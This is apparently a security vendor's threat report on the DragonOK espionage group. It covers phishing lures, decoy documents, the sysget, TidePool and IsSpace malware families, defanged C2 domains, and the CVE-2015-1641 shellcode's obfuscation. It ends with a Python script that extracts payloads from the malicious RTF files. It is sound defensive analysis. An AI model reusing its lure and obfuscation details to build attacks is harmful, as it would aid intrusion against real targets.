              <img width="650" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-300x138.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-370x171.jpg 370w" sizes="(max-width: 650px) 100vw, 650px" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/unit42-dragonok-updates-toolset-targets-multiple-geographic-regions/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p>The DragonOK group has been actively launching attacks for years. We first discussed them in <a href="http://researchcenter.paloaltonetworks.com/2015/04/unit-42-identifies-new-dragonok-backdoor-malware-deployed-against-japanese-targets/">April 2015 when we witnessed them targeting a number of organizations in Japan</a>. In recent months, Unit 42 has observed a number of attacks that we attribute to this group. Multiple new variants of the previously discussed sysget malware family have been observed in use by DragonOK. Sysget malware was delivered both directly via phishing emails, as well as in <a href="https://en.wikipedia.org/wiki/Rich_Text_Format">Rich Text Format (RTF)</a> documents exploiting the <a href="https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1641">CVE-2015-1641</a> vulnerability (patched in <a href="http://technet.microsoft.com/security/bulletin/MS15-033">MS15-033</a>) that in turn leveraged a very unique shellcode. Additionally, we have observed instances of the <a href="http://researchcenter.paloaltonetworks.com/2015/07/watering-hole-attack-on-aerospace-firm-exploits-cve-2015-5122-to-install-isspace-backdoor/">IsSpace</a> and <a href="http://researchcenter.paloaltonetworks.com/2016/05/operation-ke3chang-resurfaces-with-new-tidepool-malware/">TidePool</a> malware families being delivered via the same techniques. While Japan is still the most heavily targeted geographic region by this particular actor, we also observed instances where individuals or organizations in Taiwan, Tibet, and Russia also may have been targeted.</p>
<h3>Infiltration</h3>
<p>We observed two unique techniques of infiltration for this particular campaign:</p>
<ol>
<li>Phishing emails being sent with malicious executables directly attached</li>
<li>Malicious RTF files which exploit <a href="https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1641">CVE-2015-1641</a>.</li>
</ol>
<p>The phishing emails had the following characteristics:</p>
<p><strong>Email Subjects</strong></p>
<ul>
<li>Pickup at the <a href="https://en.wikipedia.org/wiki/Juanda_International_Airport">Juanda Airport</a> (1-Sep)</li>
<li>ポイントプレゼントのお知らせ [Roughly Translated: Point gift announcement]</li>
<li>20周年記念パーティー [Roughly Translated: 20th Anniversary Party]</li>
<li>参加者の10周年記念同窓会一覧 [Roughly Translated: List of participants&#8217; 10th anniversary alumni association]</li>
<li>子供の調査連れ [Roughly Translated: Children&#8217;s investigation]</li>
<li>G20 report</li>
<li>記念日の再会 [Roughly Translated: Anniversary reunion]</li>
<li>最新の人事異動通知 [Roughly Translated: Recent personnel change notice]</li>
</ul>
<p><strong>Attachment Filenames</strong></p>
<ul>
<li>G20 report.exe</li>
<li>exe</li>
<li>List of Participants.exe</li>
<li>Registration form.exe</li>
</ul>
<p>These emails targeted the following industries in Japan:</p>
<ul>
<li>Manufacturing</li>
<li>Higher Education</li>
<li>Energy</li>
<li>Technology</li>
<li>Semiconductor</li>
</ul>
<p>The malicious RTF files in question leverage a very specific shellcode to drop and execute the malicious payload, as well as a decoy document. Decoy documents are legitimate benign documents that are opened after the malicious payload is delivered, thus ensuring that the victim does not become suspicious because their expected document opened as expected.</p>
<p>Two samples were found to include the decoy document show in Figure 1.</p>
<p>The title of the document roughly translates to “Ministry of Communications &amp; Departments Authorities Empty Sites and Hosted Public Works Source Clearance Photos”. The use of traditional Chinese indicators the target likely residing in either Taiwan, Hong Kong, or Macau. However, based on the Taiwanese subject matter in this document, we can safely come to the conclusion that the intended victim was of Taiwanese origin. These samples delivered an updated version of the IsSpace malware family, which was <a href="http://researchcenter.paloaltonetworks.com/2015/07/watering-hole-attack-on-aerospace-firm-exploits-cve-2015-5122-to-install-isspace-backdoor/">discussed previously in a watering hole attack targeting an aerospace firm</a>. IsSpace is an evolved variant of the NFlog backdoor, which has been used by DragonOK in the past.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_1.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-23057" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_1.png" alt="dragon_1" width="747" height="924" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_1.png 747w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_1-243x300.png 243w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_1-370x458.png 370w" sizes="(max-width: 747px) 100vw, 747px" /></a></p>
<p><em>Figure 1 Taiwanese decoy document</em></p>
<p>Two other samples were identified that used a Tibet-themed decoy document. The document in question (Figure 2) appears to be an internal newsletter from the <a href="http://tibet.net/information/">Central Tibetan Ministry</a>, as suggested by the logo used as well as the content of the document itself.  This document indicates that the malware may have been targeted towards an individual that is interested in Tibetan affairs. These particular samples were unique in that they delivered the TidePool malware family that <a href="http://researchcenter.paloaltonetworks.com/2016/05/operation-ke3chang-resurfaces-with-">we reported on in May of 2016</a>. We have not previously observed DragonOK using TidePool in attacks.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_2.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-23054" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_2.png" alt="dragon_2" width="974" height="457" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_2.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_2-900x422.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_2-300x141.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_2-768x360.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_2-370x174.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></a></p>
<p><em>Figure 2 Tibetan decoy document containing internal newsletter</em></p>
<p>We also identified an additional sample using decoy targeting Taiwanese victims (Figure 3), which deployed a newer sysget sample.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_3.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-23051" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_3.png" alt="dragon_3" width="738" height="1048" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_3.png 738w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_3-211x300.png 211w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_3-721x1024.png 721w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_3-370x525.png 370w" sizes="(max-width: 738px) 100vw, 738px" /></a></p>
<p><em>Figure 3 Taiwanese-targeted decoy document</em></p>
<p>Other new samples associated with this group used a Russian language decoy document (Figure 4.) The decoy document in question discusses the GOST block cipher, which was created by the Russian government in the 1970’s. The combination of Russian language and Russian-specific subject matter indicates that the intended victim speaks Russian and may be interested in encryption. Like the previously discussed Tibetan decoy documents, these samples also delivered the TidePool malware family.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_4.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-23048" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_4.png" alt="dragon_4" width="727" height="940" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_4.png 727w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_4-232x300.png 232w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_4-370x478.png 370w" sizes="(max-width: 727px) 100vw, 727px" /></a></p>
<p><em>Figure 4 Russian decoy document discussing the GOST block cipher</em></p>
<p>Finally, multiple samples used a traditional Chinese language decoy document that discussed a subsidy welfare adjustment program. The use of traditional Chinese indicators the target likely residing in either Taiwan, Hong Kong, or Macau. Similar to other attacks witnessed, a variant of the sysget malware family is installed by these files.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_5.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-23045" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_5.png" alt="dragon_5" width="743" height="846" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_5.png 743w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_5-263x300.png 263w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_5-370x421.png 370w" sizes="(max-width: 743px) 100vw, 743px" /></a></p>
<p><em>Figure 5 Decoy document discussing subsidy welfare adjustment program</em></p>
<h3>Malware Deployed</h3>
<p>In looking at the various malware samples used in attempted attacks, the following four families were identified:</p>
<ul>
<li>Sysget version 2</li>
<li>Sysget version 3</li>
<li>TidePool</li>
<li>IsSpace</li>
</ul>
<p>We broke the sysget classification into multiple variants when we found that a number of changes have been made since our April 2015 report. Major distinctions between the versions of sysget include the following:</p>
<p><strong>Sysget version 2</strong></p>
<ul>
<li>Removed support for persistence on Windows XP</li>
<li>Reworked the URIs used for network communication</li>
<li>Added additional layers of encryption for network communication and stored configuration files</li>
<li>Switched from RC4 to AES-128</li>
</ul>
<p><strong>Sysget version 3</strong></p>
<ul>
<li>Numerous anti-debug and anti-vm procedures added</li>
<li>Encrypted URIs in network communication with an initial static key</li>
</ul>
<p>In addition, we observed a sysget version 4 that was discovered in another sample during our research. This version is not attributed to a specific attack against an organization.</p>
<p>Indicators of compromise related to sysget version 4 and other samples not directly attributed to specific attacks may be found in the Appendix of this blog post.  Additionally, more information about the various sysget variants may also be found in the Appendix.</p>
<p>The TidePool samples encountered are consistent with the samples previously discussed. I encourage readers to view <a href="http://researchcenter.paloaltonetworks.com/2016/05/operation-ke3chang-resurfaces-with-new-tidepool-malware/">our previous blog post</a> to learn more about the intricacies of this particular malware family.</p>
<p>The IsSpace malware sample, however, looks to have been updated since <a href="http://researchcenter.paloaltonetworks.com/2015/07/watering-hole-attack-on-aerospace-firm-exploits-cve-2015-5122-to-install-isspace-backdoor/">last we wrote on it</a>. While the available commands from the command and control (C2) server remains the same, the URI structure of the network communication has been modified. Additionally, the installation routine for this malware family has been updated to be far less complex than previous discussed versions, favoring PowerShell to set persistence and forgoing the previously used side-loading technique. A more detailed analysis of the new instances of IsSpace may be found at the end of this blog post in the Appendix.</p>
<h3>Infrastructure</h3>
<p>A number of unique domains were employed by the various Trojans used in these attacks. For the numerous instances of sysget we observed, the following domains were observed for their C2:</p>
<ul>
<li>kr44.78host[.]com</li>
<li>gtoimage[.]com</li>
<li>gogolekr[.]com</li>
</ul>
<p>All of the above domains have Chinese WHOIS registrant details. Additionally, the gotoimage[.]com and trend.gogolekr[.]com are both registered to the same registrant and resolve to the same netblock of 104.202.173.0/24.</p>
<p>The instances of TidePool identified communicated with the following C2 servers:</p>
<ul>
<li>europe.wikaba[.]com</li>
<li>russiaboy.ssl443[.]org</li>
<li>cool.skywave[.]top</li>
</ul>
<p>These domains did not have many definitive relations with the sysget C2 servers except for cool.skywave[.]top, which shared a unique registrant email with the sysget C2 server of trend.gogolekr[.]com. Additionally, the geographic region of the resolved IPs was consistent with the previous set, as they all resolved to various regions in southeast Asia. Specifically, the domains resolved to China, Korea, and Taiwan in the past six months.</p>
<p>The IsSpace samples resolved to the following domains:</p>
<ul>
<li>www.dppline[.]org</li>
<li>www.matrens[.]top</li>
</ul>
<p>These domains had no apparent connections to the previously discussed C2 servers, other than the fact that they resolved to Korea and Hong Kong respectively. Additionally, the registrar of ‘Jiangsu Bangning Science and technology Co. Ltd.’ was used for a large number of domains. A full graph of the relations between the various attacks is shown in Figure 6.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_6.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-23042" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_6.png" alt="dragon_6" width="974" height="557" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_6.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_6-900x515.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_6-300x172.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_6-768x439.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_6-370x212.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></a></p>
<p><em>Figure 6 Relationships between attacks</em></p>
<h3>Conclusion</h3>
<p>The DragonOK group are quite active and continue updating their tools and tactics. Their toolset is being actively developed to make detection and analysis more difficult. Additionally, they appear to be using additional malware toolsets such as TidePool. While Japan is still the most-targeted region by this group, they look to be seeking out victims in other regions as well, such as Taiwan, Tibet, and Russia.</p>
<p>Palo Alto Network customers are protected against this threat in the following ways:</p>
<ul>
<li>Malware families are tagged in AutoFocus via a variety of tags (<a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Tidepool">TidePool</a>, <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.NFlog">NFlog</a>, <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Sysget">Sysget</a>)</li>
<li>The following IPS signatures detect malicious network traffic:
<ul>
<li>IPS signature 14365 (IsSpace.Gen Command And Control Traffic)</li>
<li>IPS signature 14588 (Suspicious.Gen Command And Control Traffic)</li>
<li>IPS signature 13574 (NfLog.Gen Command And Control Traffic)</li>
<li>IPS signature 13359 (Nflog.Gen Command And Control Traffic)</li>
</ul>
</li>
<li>All samples are appropriately marked malicious in WildFire</li>
</ul>
<h3>Appendix</h3>
<p><strong>CVE-2015-1641 Exploit and Shellcode</strong></p>
<p>This particular group uses a very specific shellcode payload when exploiting CVE-2015-1641. This CVE is memory corruption vulnerability which allows for arbitrary code execution in various versions of Microsoft Office, including 2007, 2010, and 2013.</p>
<p>The shellcode begins by dynamically loading a small number of API functions from kernel32. A number of hashes are included that represent function names, which have a rotate right 7 (ROR7) operation applied against them before being XORed against a key of “\x10\xAD\xBE\xEF”. The ROR7 operation is a very common technique in shellcode to obfuscate what functions are being called. The author added the XOR operation to add another layer of obfuscation.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_7.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-23039" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_7.png" alt="dragon_7" width="974" height="369" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_7.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_7-900x341.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_7-300x114.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_7-768x291.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_7-370x140.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></a></p>
<p><em>Figure 7 API function hashes contained in shellcode</em></p>
<p>After the shellcode loads the necessary API functions, it proceeds to seek out a number of markers that will mark the beginning and ending of both an embedded malicious payload, as well as a decoy document.</p>
<p>The malicious executable is marked with a starting point of 0xBABABABABABA and an end marker of 0xBBBBBBBB. The decoy document is found immediately after the end of the malicious payload, and has an end marker of 0xBCBCBCBC. Both executables are encrypted with a 4-byte XOR key. Should the original data contain 0x00000000, it will not have the XOR applied against it.</p>
<p>The malicious payload is XORed against a key of 0xCAFEBEEF and the decoy document is XORed against 0xBAADF00D. The following script may be applied against the RTF document to extract both the malicious payload and the decoy:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c78cc258064108272" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
import sys, binascii
from itertools import cycle, izip
import re

def xor(message, key):
  return ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key)))


def decrypt(data, key):
  output = ""
  iteration = 4
  position = 0
  while True:
    window = data[position:position+iteration]
    if window == "\x00\x00\x00\x00":
      output += window
    else:
      output += xor(window, key)
    position += iteration
    if position == len(data) or position &gt; len(data):
      break
  return output


def extract(data):
  exe_data, doc_data = None, None
  exe_starting_point = data.index("\xBA\xBA\xBA\xBA\xBA\xBA") + 6
  exe_ending_point = None
  ending_points = [m.start() for m in re.finditer("\xBB\xBB\xBB\xBB", data)]
  for e in ending_points:
    if e &gt; exe_starting_point:
      exe_ending_point = e
  if exe_starting_point and exe_ending_point:
    mz_data = data[exe_starting_point:exe_ending_point]
    exe_data = decrypt(mz_data, "\xBE\xBA\xFE\xCA")
  else:
    raise Exception("Unable to find correct offsets for executable.")

  doc_starting_point = exe_ending_point + 4
  doc_ending_point = None
  ending_points = [m.start() for m in re.finditer("\xBC\xBC\xBC\xBC", data)]
  for e in ending_points:
    if e &gt; doc_starting_point:
      doc_ending_point = e
  if doc_starting_point and doc_ending_point:
    doc = data[doc_starting_point:doc_ending_point]
    doc_data = decrypt(doc, "\x0D\xF0\xAD\xBA")
  else:
    raise Exception("Unable to find correct offsets for document.")
  return [exe_data, doc_data]


def main():
  input_file = sys.argv[1]
  input_fh = open(input_file, 'rb')
  input_data = input_fh.read()
  input_fh.close()
  exe, doc = extract(input_data)

  filename = "{}.exe".format(input_file)
  output_file = open(filename, 'wb')
  output_file.write(exe)
  output_file.close()
  print "[+] Wrote {}".format(filename)

  filename = "{}.doc".format(input_file)
  output_file = open(filename, 'wb')
  output_file.write(doc)
  output_file.close()
  print "[+] Wrote {}".format(filename)


if len(sys.argv) == 2 and __name__ == "__main__":
  main()</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-2">2</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-4">4</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-6">6</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-8">8</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-10">10</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-12">12</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-14">14</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-16">16</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-18">18</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-20">20</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-22">22</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-24">24</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-26">26</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-28">28</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-30">30</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-32">32</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-34">34</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-36">36</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-38">38</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-40">40</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-42">42</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-44">44</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-46">46</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-48">48</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-50">50</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-52">52</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-54">54</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-56">56</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-58">58</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-60">60</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-62">62</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-64">64</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-66">66</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-68">68</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-70">70</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-72">72</div><div class="crayon-num" data-line="crayon-5f694c78cc258064108272-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc258064108272-74">74</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c78cc258064108272-1"><span class="crayon-e">import </span><span class="crayon-v">sys</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">binascii</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-2"><span class="crayon-e">from </span><span class="crayon-e">itertools </span><span class="crayon-e">import </span><span class="crayon-v">cycle</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">izip</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-3"><span class="crayon-e">import </span><span class="crayon-e">re</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-4">&nbsp;</div><div class="crayon-line" id="crayon-5f694c78cc258064108272-5"><span class="crayon-e">def </span><span class="crayon-st">xor</span><span class="crayon-sy">(</span><span class="crayon-v">message</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">key</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">.</span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-e">chr</span><span class="crayon-sy">(</span><span class="crayon-e">ord</span><span class="crayon-sy">(</span><span class="crayon-v">c</span><span class="crayon-sy">)</span><span class="crayon-o">^</span><span class="crayon-e">ord</span><span class="crayon-sy">(</span><span class="crayon-v">k</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-v">c</span><span class="crayon-sy">,</span><span class="crayon-i">k</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">izip</span><span class="crayon-sy">(</span><span class="crayon-v">message</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">cycle</span><span class="crayon-sy">(</span><span class="crayon-v">key</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-8">&nbsp;</div><div class="crayon-line" id="crayon-5f694c78cc258064108272-9"><span class="crayon-e">def </span><span class="crayon-e">decrypt</span><span class="crayon-sy">(</span><span class="crayon-v">data</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">key</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-10"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">output</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-11"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">iteration</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">4</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-12"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">position</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-13"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-t">True</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">window</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">data</span><span class="crayon-sy">[</span><span class="crayon-v">position</span><span class="crayon-o">:</span><span class="crayon-v">position</span><span class="crayon-o">+</span><span class="crayon-v">iteration</span><span class="crayon-sy">]</span></div><div 